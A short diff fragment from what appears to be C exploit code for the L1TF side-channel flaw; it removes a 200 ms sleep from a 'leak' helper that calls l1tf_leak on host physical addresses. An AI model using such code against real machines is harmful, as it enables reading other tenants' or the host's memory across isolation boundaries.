@@ -21,8 +21,7 @@ hpa_t gadget_base(void)
 void leak(void *data, hpa_t base, hpa_t pa, int len)
 {
 	leak_attempts += len;
-	usleep(200000);
-        l1tf_leak(data, base, pa, len);
+	l1tf_leak(data, base, pa, len);
 }
 
 u64 leak64(hpa_t base, hpa_t pa)
